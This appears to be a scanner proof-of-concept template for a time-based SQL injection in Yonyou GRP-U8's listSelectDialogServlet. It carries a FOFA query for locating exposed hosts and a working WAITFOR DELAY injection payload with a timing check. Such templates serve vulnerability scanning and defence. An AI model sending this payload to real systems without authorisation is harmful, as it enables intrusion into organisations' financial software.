id: poc-yaml-yongyou-grp-u8-listselectdialogservlet-sqli
info:
  name: 用友GRP-U8 listSelectDialogServlet SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: GRP-U8
  fofa: app="用友-GRP-U8"
variables:
  t1: random_int(2,6)
  t2: (t1 * 2) + 1
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"GRP-U8")
- method: GET
  path: /listSelectDialogServlet?slType=slFZX&slCdtn=1=2;WAITFOR+DELAY+%270:0:{{.t1}}%27--
  expression: status_code == 200 && contains(body,"[]") && duration >= t1 && duration
    <= t2
transport: http
